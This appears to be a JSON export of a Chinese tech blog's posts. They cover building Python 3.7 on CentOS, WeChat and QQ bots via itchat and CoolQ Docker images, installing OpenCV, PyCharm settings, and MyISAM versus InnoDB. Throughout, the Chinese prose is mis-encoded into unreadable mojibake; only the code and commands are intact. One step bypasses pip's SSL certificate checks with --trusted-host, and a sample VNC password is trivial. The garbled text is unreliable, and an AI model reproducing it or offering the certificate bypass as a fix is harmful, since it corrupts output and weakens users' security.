æ‰€ä»¥å…ˆæŠŠè¿™äº›è½¯ä»¶éƒ½å®‰è£…äº†.\n\n```shell\nyum install gcc  \n\nyum install zlib* # æ³¨æ„æ­¤å¤„å¸¦*, å› ä¸ºéœ€è¦ zlib-devel\n\nyum install libffi-devel # ä¸å®‰è£…æŠ¥é”™ModuleNotFoundError: No module named '_ctypes'\n\nyum install openss openssl-devel # ä¸å®‰è£…ä¼šå¯¼è‡´pip3ç¼ºå°‘ssl, æ— æ³•ä¸‹è½½åŒ…\n\n```\n\n\n\n### 3. æºç å®‰è£…python3.7\n\n```shell\nwget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz  # ä¸‹è½½æºç \n\ntar -zxvf Python-3.7.3.tgz\n\ncd Python-3.7.3\n\n./configure --with-ssl --with-ensurepip=install # --with-ensurepip=installæ˜¯å®‰è£…pip3 --with-sslæ˜¯è®©pip3æ”¯æŒssl\n\nmake \n\nmake altinstall # æ³¨æ„æ­¤å¤„æ˜¯altinstall, å¦‚æœæ˜¯install, ä¼šå’Œpython2é€ æˆå†²çª\n```\n\n\n\n### 4. å»ºç«‹pythonè½¯é“¾æ¥\n\nå®‰è£…æˆåŠŸå, æ‰§è¡Œç¨‹åºä¸ºpython3.7, æˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨éœ€è¦å»ºç«‹ä¸€ä¸ªè½¯é“¾æ¥\n\n```shell\nwhich python3.7\n/usr/local/bin/python3.7\n\n\nln -s /usr/local/bin/python3.7 /usr/local/bin/python3\nln -s /usr/local/bin/pip3.7 /usr/local/bin/pip3\n```\n\n","tags":["linux"],"categories":["python"]},{"title":"å¾®ä¿¡æœºå™¨äººitchatçš„ä½¿ç”¨","url":"%2Fp%2F4f93001b.html","content":"\n\n\nè¿‘æœŸå‡†å¤‡ç”¨å¾®ä¿¡æœºå™¨äººå®ç°å¾€å¾®ä¿¡ç¾¤é‡Œå‘æ¶ˆæ¯. éœ€è¦ç”¨åˆ°å¾®ä¿¡æœºå™¨äºº.\n\nç›®å‰çš„å¾®ä¿¡æœºå™¨äººå¤§éƒ¨åˆ†éƒ½æ˜¯åŸºäºwebå¾®ä¿¡åè®®, å› æ­¤ä»…èƒ½è¦†ç›– Web å¾®ä¿¡æœ¬èº«æ‰€å…·å¤‡çš„åŠŸèƒ½ã€‚ä¾‹å¦‚æ”¶å‘æ¶ˆæ¯, åŠ å¥½å‹, è½¬å‘æ¶ˆæ¯, è‡ªåŠ¨å›å¤, é™ªäººèŠå¤©,æ¶ˆæ¯é˜²æ’¤å›ç­‰ç­‰.\n\nä½†æ˜¯webå¾®ä¿¡ç›®å‰ä¸æ”¯æŒæŠ¢çº¢åŒ…å’Œæœ‹å‹åœˆç­‰ç›¸å…³åŠŸèƒ½, å¹¶ä¸”ä½¿ç”¨æœºå™¨äººå­˜åœ¨ä¸€å®šæ¦‚ç‡è¢«é™åˆ¶ç™»å½•çš„å¯èƒ½æ€§, ä¸»è¦è¡¨ç°ä¸ºæ— æ³•ç™»é™† Web å¾®ä¿¡ (ä½†ä¸å½±å“æ‰‹æœºç­‰å…¶ä»–å¹³å°)ã€‚\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…ä½¿ç”¨\n\n+ å¯å‚è€ƒ: https://github.com/littlecodersh/ItChat\n\n```shell\npip3 install itchat\n```\n\n\n\n+ ç™»å½•å¾®ä¿¡å¹¶ä¸”å‘æ–‡ä»¶åŠ©æ‰‹å‘é€ä¸€æ¡æ¶ˆæ¯\n\n```python\nimport itchat\n\nitchat.auto_login()\n\nitchat.send('Hello, filehelper', toUserName='filehelper')\n```\n\n\n\n+ æ›´å¤šä¾‹å­å¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ https://itchat.readthedocs.io/zh/latest/\n\n\n\n### 2. å‘é€æ¶ˆæ¯åˆ°å¾®ä¿¡ç¾¤\n\nå‘é€æ¶ˆæ¯åˆ°å¾®ä¿¡ç¾¤, é¦–å…ˆè¦ä¿è¯å¾®ä¿¡ç¾¤ä¿å­˜åœ¨é€šè®¯å½•, å¦‚æœä¸ä¿å­˜åˆ°é€šè®¯å½•ï¼Œæ˜¯æ— æ³•åœ¨å„è®¾å¤‡ä¹‹é—´åŒæ­¥çš„ï¼ˆæ‰€ä»¥itchatä¹Ÿæ— æ³•è¯»å–åˆ°ï¼‰\n\n```python\n# coding=utf8\nimport itchat\n\n\ndef send_group(group, msg):\n    rooms = itchat.get_chatrooms(update=True)\n    rooms = itchat.search_chatrooms(name=group)\n    if not rooms:\n        print(\"None group found\")\n    else:\n        itchat.send(msg, toUserName=rooms[0][\"UserName\"])\n\n\nif __name__ == \"__main__\":\n    itchat.auto_login(hotReload=True)\n    send_group(u\"ä½ çš„ç¾¤èŠåå­—\", \"test msg\")\n    itchat.run()\n\n```\n\n\n\n\n\n### 3. æœºå™¨äººAIèŠå¤©\n\n```python\n# coding=utf8\nimport itchat\nimport requests\n\nKEY = 'xxxxxxxx' #å¯ä»¥å»http://www.turingapi.com/ç”³è¯·\n\n\ndef get_response(msg):\n    apiUrl = 'http://www.tuling123.com/openapi/api'\n    data = {\n        'key': KEY,\n        'info': msg,\n        'userid': 'wechat-robot',\n    }\n    try:\n        r = requests.post(apiUrl, data=data).json()\n        return r.get('text')\n    except:\n        return\n\n\n@itchat.msg_register(itchat.content.TEXT)\ndef tuling_reply(msg):\n    defaultReply = 'I received: ' + msg['Text']\n    reply = get_response(msg['Text'])\n    return reply or defaultReply\n\n\nitchat.auto_login(hotReload=True)\nitchat.run()\n```\n\n\n\n### 4. æ¶ˆæ¯é˜²æ’¤å›\n\nå¯å‚è€ƒä¸‹é¢çš„è¿™ä¸ªé¡¹ç›®\n\nhttps://github.com/ccding/wechat-anti-revoke \n\n\n\n### 5. å…¶ä»–å¾®ä¿¡æœºå™¨äººé¡¹ç›®\n\n+ https://github.com/youfou/wxpy   åœ¨ itchat çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡å¤§é‡æ¥å£ä¼˜åŒ–æå‡äº†æ¨¡å—çš„æ˜“ç”¨æ€§ï¼Œå¹¶è¿›è¡Œä¸°å¯Œçš„åŠŸèƒ½æ‰©å±•\n+ https://github.com/lb2281075105/Python-WeChat-ItChat ä½¿ç”¨itchatçš„ä¸€äº›demo\n+ https://github.com/littlecodersh/itchatmp å¾®ä¿¡å…¬ä¼—å·ã€ä¼ä¸šå·æ¥å£é¡¹ç›®\n+ https://github.com/newflydd/itchat4go golangç‰ˆæœ¬å°è£…çš„itchat\n\n\n\n","tags":["wechat"],"categories":["çˆ¬è™«"]},{"title":"qqæœºå™¨äººé…·qçš„ä½¿ç”¨","url":"%2Fp%2F545a4e78.html","content":"\n\n\nè¿‘æœŸå‡†å¤‡ç”¨qqæœºå™¨äººå®ç°å¾€qqç¾¤é‡Œå‘æ¶ˆæ¯. éœ€è¦ç”¨åˆ°qqæœºå™¨äºº.\n\næ®è¯´åœ¨2019å¹´å‰, ç”¨qqæœºå™¨äººæ˜¯éå¸¸ä¹‹æ–¹ä¾¿. ä½†æ˜¯è‡ªä»Smart QQ åè®®åœ¨ 2019 å¹´ 1 æœˆ 1 æ—¥åœæ­¢æœåŠ¡å, ç½‘ä¸Šå¥½å¤šqqæœºå™¨äººé¡¹ç›®éƒ½å¤±æ•ˆäº†.\n\nç›®å‰æ‰¾åˆ°äº†ä¸€æ¬¾é…·Qæœºå™¨äºº https://cqp.cc/, ä½¿ç”¨å¹¶ä¸”æµ‹è¯•æˆåŠŸ.  æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯é…·Qçš„Airç‰ˆè¿˜æ˜¯å…è´¹çš„.\n\n\n\n<!-- more -->\n\n### 1. ä¸‹è½½ä½¿ç”¨\n\né…·Qå®˜æ–¹ä¸‹è½½çš„æ˜¯windowsç‰ˆæœ¬(https://cqp.cc/t/23253) , éœ€è¦åœ¨windowsä¸Šè¿è¡Œå¹¶ç™»å½•QQ. è¿™ä¸ªè™½ç„¶ç®€å•æ–¹ä¾¿, ä½†æ˜¯éœ€è¦ä¸€ç›´åœ¨windowsä¸ŠæŒ‚ç€, å¾ˆæ˜¾ç„¶è¿™ä¸ªæ¡ä»¶ä¸å¤ªå…·å¤‡.\n\nç›®çš„æ˜¯åœ¨linuxä¸ŠæŒ‚æœºè¿è¡Œé…·Q, æ‰€ä»¥æ‰¾åˆ°äº†é…·Qçš„`docker`ç‰ˆæœ¬.\n\n\n\n### 2. å®‰è£…é…·Q dockerç‰ˆæœ¬\n\n+ å®‰è£…docker(å·²å®‰è£…dockerç›´æ¥çœ‹ä¸‹ä¸€æ­¥)\n\n```shell\nyum install yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\nyum install docker-ce\n\n\nsystemctl start docker\nsystemctl enable docker\n```\n\n\n\n+ å®‰è£…é…·Qå®˜æ–¹ docker ç‰ˆæœ¬  https://cqp.cc/t/34558 (å»ºè®®å®‰è£…ä¸‹é¢çš„CoolQæ’ä»¶ç‰ˆæœ¬)\n\n```shell\ndocker pull coolq/wine-coolq\nmkdir /root/coolq-data # ç”¨äºå­˜å‚¨é…· Q çš„ç¨‹åºæ–‡ä»¶\n\ndocker run --name=coolq --d \\\n-p 9001:9000 \\ # noVNC ç«¯å£ï¼Œç”¨äºä»æµè§ˆå™¨æ§åˆ¶é…· Q\n-v /root/coolq-data:/home/user/coolq \\ # å°†å®¿ä¸»ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…ç”¨äºæŒä¹…åŒ–é…· Q çš„ç¨‹åºæ–‡ä»¶\n-e VNC_PASSWD=12345678 \\ # è®¾ç½®noVNCç™»å½•å¯†ç , é»˜è®¤å¯†ç æ˜¯ MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # è¦ç™»å½•çš„ QQ è´¦å·ï¼Œå¯é€‰\ncoolq/wine-coolq\n```\n\næ­¤æ—¶åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://ä½ çš„æœåŠ¡å™¨IP:ä½ çš„ç«¯å£ å³å¯çœ‹åˆ°è¿œç¨‹æ“ä½œç™»å½•é¡µé¢ï¼Œè¾“å…¥å¯†ç ï¼Œå³å¯çœ‹åˆ° é…·Q Air çš„ç™»å½•ç•Œé¢å•¦ã€‚\n\n\n\n+ å®‰è£…CoolQæ’ä»¶çš„ docker ç‰ˆæœ¬ https://github.com/richardchien/coolq-http-api\n\nCoolQæ’ä»¶é€šè¿‡ HTTP æˆ– WebSocket å¯¹é…· Q çš„äº‹ä»¶è¿›è¡Œä¸ŠæŠ¥ä»¥åŠæ¥æ”¶è¯·æ±‚æ¥è°ƒç”¨é…· Q çš„ DLL æ¥å£ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨å…¶å®ƒè¯­è¨€ç¼–å†™é…· Q æ’ä»¶ã€‚\n\n  \n\n```shell\ndocker pull richardchien/cqhttp:latest\nmkdir coolq  # ç”¨äºå­˜å‚¨é…· Q çš„ç¨‹åºæ–‡ä»¶\n\ndocker run -ti -d --name cqhttp-test \\\n-v $(pwd)/coolq:/home/user/coolq \\  # å°†å®¿ä¸»ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…ç”¨äºæŒä¹…åŒ–é…· Q çš„ç¨‹åºæ–‡ä»¶\n-p 9001:9000 \\ # noVNC ç«¯å£ï¼Œç”¨äºä»æµè§ˆå™¨æ§åˆ¶é…· Q\n-p 5700:5700 \\ # HTTP API æ’ä»¶å¼€æ”¾çš„ç«¯å£\n-e VNC_PASSWD=12345678 \\ # è®¾ç½®noVNCç™»å½•å¯†ç , é»˜è®¤å¯†ç æ˜¯ MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # è¦ç™»å½•çš„ QQ è´¦å·ï¼Œå¯é€‰\n-e CQHTTP_SERVE_DATA_FILES=yes \\ # å…è®¸é€šè¿‡ HTTP æ¥å£è®¿é—®é…· Q æ•°æ®æ–‡ä»¶\nrichardchien/cqhttp:latest\n```\n\n\n\n### 3. å‘é€æ¶ˆæ¯åˆ°qqç¾¤\n\nå…¶å®QQæœºå™¨äººä¸ä»…èƒ½å‘é€æ¶ˆæ¯åˆ°qqç¾¤, è¿˜èƒ½å‘é€æ¶ˆæ¯åˆ°ä¸ªäºº, è½¬å‘ç¾¤æ¶ˆæ¯, åŠ å¥½å‹, è¸¢äººç­‰ä¸€ç³»åˆ—æ“ä½œ\n\nè¯¦è§apiåˆ—è¡¨:  https://richardchien.gitee.io/coolq-http-api/docs/4.8/#/API\n\n\n\n+ è°ƒç”¨æ–¹å¼ä¹Ÿå¾ˆç®€å•, å‚è§apiæ–‡æ¡£\n\n```\nPOST  http://ip:5700/send_group_msg\n\ngroup_id: qqç¾¤å·\nmessage: å‘é€çš„æ¶ˆæ¯\n```\n\n\n\n### 4. é…·Qæœºå™¨äººAIèŠå¤©\n\næœºå™¨äººè¿˜æœ‰ä¸ªç”¨å¤„å°±æ˜¯å¯ä»¥å®ç°AIè‡ªåŠ¨èŠå¤©.\n\nç›®å‰é…·Qæ”¯æŒ å›¾çµæœºå™¨äºº(http://www.turingapi.com/)å’Œå°iæœºå™¨äºº(http://cloud.xiaoi.com/)\n\nå®‰è£…é…·Qå,æ·»åŠ å¯¹åº”çš„ç¨‹åºå³å¯","tags":["robot"],"categories":["çˆ¬è™«"]},{"title":"opencvåœ¨pythonä¸‹çš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2F415d206d.html","content":"\n\n\n### å®‰è£…opencv\n\n\n```shell\npip3 install numpy\npip3 install opencv-python\n```\n\nåœ¨å®‰è£…`opencv-python`å‡ºç°äº†ä»¥ä¸‹é”™è¯¯ä¿¡æ¯:\n\n```\n Could not fetch URL https://pypi.org/simple/opencv-python/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/opencv-python/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:726)'),)) - skipping\n```\n\nè§£å†³æ–¹æ¡ˆ: \n\n```shell\npip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org opencv-python\n```\n\n\n\n<!-- more -->\n\n### opencv rotate code\n\n```python\nimport sys\nimport cv2\nimport numpy as np\n\n\nif len(sys.argv) != 2 :\n    print(\"usage: ./images path\")\n    sys.exit(1)\n\nimg = cv2.imread(sys.argv[1])\ncv2.imshow(\"Source\", img)\n\nimg90 = np.rot90(img) # æ—‹è½¬90\ncv2.imshow(\"Rotate\", img90)\n\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n```\n","tags":["python"],"categories":["python"]},{"title":"opencvåœ¨macæºç å®‰è£…å¹¶è¿è¡Œcppç‰ˆ","url":"%2Fp%2F9c99a6b7.html","content":"\n\n\n### 1. mac å®‰è£… cmake\n\n+ ä¸‹è½½å®‰è£… CMakeã€‚\n\n  https://cmake.org/download/   Mac OS X 10.7 or later\n\n+ å®‰è£…å®Œæˆä¹‹åï¼Œä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åˆ›å»º/usr/local/binä¸‹ CMake çš„è½¯é“¾æ¥ã€‚\n\n```shell\nsudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\n```\n\n\n\n### 2. æºç å®‰è£… opencv\n\nç›®å‰opencvå·²ç»å‡ºåˆ°4.0+ç‰ˆæœ¬äº†, ç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹éƒ½æ˜¯2.0,3.0ç‰ˆæœ¬çš„.\n\nä¸è¿‡æˆ‘ä»¬é€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬, ç›´æ¥ä»githubä¸Šæ‹‰å–\n\n```shell\ngit clone https://github.com/opencv/opencv.git\nmkdir build\ncd build\ncmake ..\nmake \nsudo make install\n```\n\n<!-- more -->\n\n### 3. xcode é…ç½®opencv\n\nå¦‚æœä¸æƒ³ç”¨xcodeæ¥å¼€å‘, ç¼–è¯‘çš„æ—¶å€™ç›´æ¥æŒ‡å®šä¸‹é¢çš„é€‰é¡¹\n\n+ Header Search Paths\n\n```\n/usr/local/include/opencv4  (ä¸ä¸€å®šæ˜¯è¿™ä¸ª, è¦çœ‹ä½ çš„make install å®‰è£…åˆ°å“ªä¸ªç›®å½•äº†)\n```\n\n+ Library Search Paths\n\n```\n/usr/local/lib (ä¸ä¸€å®šæ˜¯è¿™ä¸ª, è¦çœ‹ä½ çš„make install å®‰è£…åˆ°å“ªä¸ªç›®å½•äº†)\n```\n\n+ Other Linker Flags\n\n```\n-lopencv_calib3d -lopencv_core -lopencv_dnn -lopencv_features2d -lopencv_flann -lopencv_gapi -lopencv_highgui -lopencv_imgcodecs -lopencv_imgproc -lopencv_ml -lopencv_objdetect -lopencv_photo -lopencv_stitching -lopencv_video -lopencv_videoio \n```\n\nä¸ä¸€å®šæ˜¯è¿™äº›, è¦å»`/usr/local/lib` æ–‡ä»¶å¤¹(`make install`å®‰è£…ç›®å½•)ä¸‹çœ‹ opencvå¼€å¤´çš„åº“\n\n\n\n\n### 4. opencv rotate code\n\n```cpp\n#include <stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage: ./images path angle\\n\");\n        return -1;\n    }\n    \n    Mat source = imread(argv[1], 1);\n    if (!source.data)\n    {\n        printf(\"No image data \\n\");\n        return -1;\n    }\n    \n    double angle = atof(argv[2]);\n    Point2f src_center(source.cols/2.0F, source.rows/2.0F);\n    Mat rot_mat = getRotationMatrix2D(src_center, angle, 1.0);\n    Mat dst;\n    warpAffine(source, dst, rot_mat, source.size());\n    \n\n    imshow(\"Source\", source);\n    imshow(\"Rotate\", dst);\n    waitKey(0);\n    \n    return 0;\n}\n```\n\n","tags":["opencv"],"categories":["c++"]},{"title":"pythonæœ€å¥½ç”¨IDEä¹‹pycharmçš„ä½¿ç”¨","url":"%2Fp%2Fb3d62374.html","content":"\n\n\nå·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨, å­¦ä¹  python è‡ªç„¶é€‰ç”¨äº† jetbrains å®¶æ—çš„ Pycharm.\n\n### 1. pycharm formatting on save\n\n1. PyCharm -> Preferences -> Plugins -> Save Actions -> install and restart ide\n2. PyCharm -> Preferences -> Save Actions -> Reformat file\n\n![1](pythonæœ€å¥½ç”¨IDEä¹‹pycharmçš„ä½¿ç”¨/1.png)\n\n<!-- more -->\n\n3. å–æ¶ˆPower Save Mode\n\n   IDEå³ä¸‹è§’æœ‰ä¸ªæœºå™¨äºº, ä¸€å®šä¸è¦å‹¾é€‰ Power Save Mode\n\n   å…·ä½“è¡¨ç°ï¼šå…³é—­åï¼ŒPycharmå°±è·Ÿæ–‡æœ¬ç¼–è¾‘å™¨å·®ä¸å¤šäº†ï¼Œä¸ä¼šå»å…³è”ä¸Šä¸‹æ–‡ï¼Œåƒçº é”™ã€è”æƒ³å…³é”®å­—ç­‰åŠŸèƒ½éƒ½æ²¡æœ‰äº†\n\n\n\n### 2. Keymap\n\nè¿›å…¥å‘ç°äº†, ctrl+w å’Œ ctrl+a å’Œ ctrl+e å¤±æ•ˆ, å¾ˆåˆ«æ‰­, ç ”ç©¶å‘ç°äº†, éœ€è¦åœ¨ Keymap é€‰æ‹©  `Mac OS X 10.5+`\n\nctrl + w å…³é—­\n\nctrl + a åˆ°è¡Œé¦–\n\nctrl + e åˆ°è¡Œå°¾\n\n\n\n### 3. Alt + Enter ä¸‡èƒ½ç»„åˆé”®\n\nimport åŒ…ç»å¸¸è¦ç”¨åˆ°è¿™ä¸ªç»„åˆé”®, ä½†æ˜¯å‘ç°åœ¨æˆ‘çš„ç”µè„‘ä¸Šåˆå¤±æ•ˆ\n\nç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ–¹æ³•ä¹Ÿæ²¡æœ‰è§£å†³. ä¸€è¯´æ˜¯å…¶ä»–ç¨‹åºå ç”¨, å¯ä»¥å…³é—­æ‰€æœ‰ç¨‹åºè¯•è¯•\n\næœ€åæ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ, å°±æ˜¯æŠŠ`Save Actions`  æ’ä»¶åœæ‰, é‡å¯ä¹‹åå†å¼€å¯, å°±å¥½äº†(åè¡€)\n\n\n\n### 4. module unresolved reference\n\n- åœ¨é¡¹ç›®çš„æ–‡ä»¶å¤¹(module çš„ä¸Šä¸€çº§)å³é”® `Mark Directory as` -> `Source root`\n- `File` -> `Invalidate Caches / Restart` and restart PyCharm.","tags":["python"],"categories":["python"]},{"title":"mysqlä¸­myisamå’ŒinnodbåŒºåˆ«","url":"%2Fp%2Ff9fde0e9.html","content":"\n\n\n# 1. MySQLå­˜å‚¨å¼•æ“\n\n### 1.1 é»˜è®¤å­˜å‚¨å¼•æ“çš„å˜è¿\n\nåœ¨MySQL 5.1ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤çš„æœç´¢å¼•æ“æ˜¯MyISAMï¼Œä»MySQL 5.5ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤çš„æœç´¢å¼•æ“å˜æ›´ä¸ºInnoDBã€‚\n\nInnoDB æ”¯æŒäº‹åŠ¡ï¼ŒMyISAM ä¸æ”¯æŒäº‹åŠ¡ã€‚è¿™æ˜¯ MySQL å°†é»˜è®¤å­˜å‚¨å¼•æ“ä» MyISAM å˜æˆ InnoDB çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\nInnoDB æœ€å°çš„é”ç²’åº¦æ˜¯è¡Œé”ï¼ŒMyISAM æœ€å°çš„é”ç²’åº¦æ˜¯è¡¨é”ã€‚ä¸€ä¸ªæ›´æ–°è¯­å¥ä¼šé”ä½æ•´å¼ è¡¨ï¼Œå¯¼è‡´å…¶ä»–æŸ¥è¯¢å’Œæ›´æ–°éƒ½ä¼šè¢«é˜»å¡ï¼Œå› æ­¤å¹¶å‘è®¿é—®å—é™ã€‚è¿™ä¹Ÿæ˜¯ MySQL å°†é»˜è®¤å­˜å‚¨å¼•æ“ä» MyISAM å˜æˆ InnoDB çš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\n<!-- more -->\n\n### 1.2 MyISAM\n\nMyISAMå­˜å‚¨å¼•æ“çš„ç‰¹ç‚¹æ˜¯ï¼šè¡¨çº§é”ã€**ä¸æ”¯æŒäº‹åŠ¡**å’Œ å…¨æ–‡ç´¢å¼•ï¼Œé€‚åˆä¸€äº›CMSå†…å®¹ç®¡ç†ç³»ç»Ÿä½œä¸ºåå°æ•°æ®åº“ä½¿ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨å¤§å¹¶å‘ã€é‡è´Ÿè·ç”Ÿäº§ç³»ç»Ÿä¸Šï¼Œè¡¨é”ç»“æ„çš„ç‰¹æ€§å°±æ˜¾å¾—åŠ›ä¸ä»å¿ƒï¼›\n\nMyISAMé€‚åˆï¼š\n\nï¼ˆ1ï¼‰åšå¾ˆå¤šcount çš„è®¡ç®—ï¼›\n\nï¼ˆ2ï¼‰æ’å…¥ä¸é¢‘ç¹ï¼ŒæŸ¥è¯¢éå¸¸é¢‘ç¹ï¼Œå¦‚æœæ‰§è¡Œå¤§é‡çš„SELECTï¼ŒMyISAMæ˜¯æ›´å¥½çš„é€‰æ‹©ï¼›\n\nï¼ˆ3ï¼‰æ²¡æœ‰äº‹åŠ¡ã€‚\n\n### 1.3 InnoDB\n\nInnoDBå­˜å‚¨å¼•æ“çš„ç‰¹ç‚¹æ˜¯ï¼šè¡Œçº§é”ã€äº‹åŠ¡å®‰å…¨ï¼ˆACIDå…¼å®¹ï¼‰ã€æ”¯æŒå¤–é”®ã€ä¸æ”¯æŒFULLTEXTç±»å‹çš„ç´¢å¼•(5.6.4ä»¥åç‰ˆæœ¬å¼€å§‹æ”¯æŒFULLTEXTç±»å‹çš„ç´¢å¼•)ã€‚\n\nInnoDBå­˜å‚¨å¼•æ“æä¾›äº†å…·æœ‰æäº¤ã€å›æ»šå’Œå´©æºƒæ¢å¤èƒ½åŠ›çš„äº‹åŠ¡å®‰å…¨å­˜å‚¨å¼•æ“ã€‚InnoDBæ˜¯ä¸ºå¤„ç†å·¨å¤§é‡æ—¶æ‹¥æœ‰æœ€å¤§æ€§èƒ½è€Œè®¾è®¡çš„ã€‚å®ƒçš„CPUæ•ˆç‡å¯èƒ½æ˜¯ä»»ä½•å…¶ä»–åŸºäºç£ç›˜çš„å…³ç³»æ•°æ®åº“å¼•æ“æ‰€ä¸èƒ½åŒ¹æ•Œçš„ã€‚\n\nInnoDBé€‚åˆï¼š\n\nï¼ˆ1ï¼‰å¯é æ€§è¦æ±‚æ¯”è¾ƒé«˜ï¼Œæˆ–è€…è¦æ±‚äº‹åŠ¡ï¼›\n\nï¼ˆ2ï¼‰è¡¨æ›´æ–°å’ŒæŸ¥è¯¢éƒ½ç›¸å½“çš„é¢‘ç¹ï¼Œå¹¶ä¸”è¡¨é”å®šçš„æœºä¼šæ¯”è¾ƒå¤§çš„æƒ…å†µæŒ‡å®šæ•°æ®å¼•æ“çš„åˆ›å»ºï¼›\n\nï¼ˆ3ï¼‰å¦‚æœä½ çš„æ•°æ®æ‰§è¡Œå¤§é‡çš„INSERTæˆ–UPDATEï¼Œå‡ºäºæ€§èƒ½æ–¹é¢çš„è€ƒè™‘ï¼Œåº”è¯¥ä½¿ç”¨InnoDBè¡¨ï¼›\n\nï¼ˆ4ï¼‰DELETE FROM tableæ—¶ï¼ŒInnoDBä¸ä¼šé‡æ–°å»ºç«‹è¡¨ï¼Œè€Œæ˜¯ä¸€è¡Œä¸€è¡Œçš„ åˆ é™¤ï¼›\n\nï¼ˆ5ï¼‰LOAD TABLE FROM MASTERæ“ä½œå¯¹InnoDBæ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œè§£å†³æ–¹æ³•æ˜¯é¦–å…ˆæŠŠInnoDBè¡¨æ”¹æˆMyISAMè¡¨ï¼Œå¯¼å…¥æ•°æ®åå†æ”¹æˆInnoDBè¡¨ï¼Œä½†æ˜¯å¯¹äºä½¿ç”¨çš„é¢å¤–çš„InnoDBç‰¹æ€§ï¼ˆä¾‹å¦‚å¤–é”®ï¼‰çš„è¡¨ä¸é€‚ç”¨ã€‚\n\n\n\nè¦æ³¨æ„ï¼Œåˆ›å»ºæ¯ä¸ªè¡¨æ ¼çš„ä»£ç æ˜¯ç›¸åŒçš„ï¼Œé™¤äº†æœ€åçš„ TYPEå‚æ•°ï¼Œè¿™ä¸€å‚æ•°ç”¨æ¥æŒ‡å®šæ•°æ®å¼•æ“ã€‚\n\n\n\n# 2. å…·ä½“åŒºåˆ«\n\n+ å­˜å‚¨ç»“æ„\n\nMyISAMï¼šæ¯ä¸ªMyISAMåœ¨ç£ç›˜ä¸Šå­˜å‚¨æˆä¸‰ä¸ªæ–‡ä»¶ã€‚åˆ†åˆ«ä¸ºï¼šè¡¨å®šä¹‰æ–‡ä»¶ã€æ•°æ®æ–‡ä»¶ã€ç´¢å¼•æ–‡ä»¶ã€‚ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„åå­—ä»¥è¡¨çš„åå­—å¼€å§‹ï¼Œæ‰©å±•åæŒ‡å‡ºæ–‡ä»¶ç±»å‹ã€‚.frmæ–‡ä»¶å­˜å‚¨è¡¨å®šä¹‰ã€‚æ•°æ®æ–‡ä»¶çš„æ‰©å±•åä¸º.MYD (MYData)ã€‚ç´¢å¼•æ–‡ä»¶çš„æ‰©å±•åæ˜¯.MYI (MYIndex)ã€‚\n\nInnoDBï¼šæ‰€æœ‰çš„è¡¨éƒ½ä¿å­˜åœ¨åŒä¸€ä¸ªæ•°æ®æ–‡ä»¶ä¸­ï¼ˆä¹Ÿå¯èƒ½æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œæˆ–è€…æ˜¯ç‹¬ç«‹çš„è¡¨ç©ºé—´æ–‡ä»¶ï¼‰ï¼ŒInnoDBè¡¨çš„å¤§å°åªå—é™äºæ“ä½œç³»ç»Ÿæ–‡ä»¶çš„å¤§å°ï¼Œä¸€èˆ¬ä¸º2GBã€‚\n\n\n\n+ ç´¢å¼•\n\nMyISAM: æ˜¯éèšé›†ç´¢å¼•ï¼Œæ•°æ®æ–‡ä»¶æ˜¯åˆ†ç¦»çš„ï¼Œç´¢å¼•ä¿å­˜çš„æ˜¯æ•°æ®æ–‡ä»¶çš„æŒ‡é’ˆã€‚ä¸»é”®ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•æ˜¯ç‹¬ç«‹çš„ã€‚\n\nInnoDB: æ˜¯èšé›†ç´¢å¼•ã€‚èšç°‡ç´¢å¼•çš„æ–‡ä»¶å­˜æ”¾åœ¨ä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ä¸Šï¼Œå› æ­¤ InnoDB å¿…é¡»è¦æœ‰ä¸»é”®ï¼Œé€šè¿‡ä¸»é”®ç´¢å¼•æ•ˆç‡å¾ˆé«˜ã€‚ä½†æ˜¯è¾…åŠ©ç´¢å¼•éœ€è¦ä¸¤æ¬¡æŸ¥è¯¢ï¼Œå…ˆæŸ¥è¯¢åˆ°ä¸»é”®ï¼Œç„¶åå†é€šè¿‡ä¸»é”®æŸ¥è¯¢åˆ°æ•°æ®ã€‚å› æ­¤ï¼Œä¸»é”®ä¸åº”è¯¥è¿‡å¤§ï¼Œå› ä¸ºä¸»é”®å¤ªå¤§ï¼Œå…¶ä»–ç´¢å¼•ä¹Ÿéƒ½ä¼šå¾ˆå¤§ã€‚\n\n\n\n+ å­˜å‚¨ç©ºé—´\n\nMyISAMï¼š 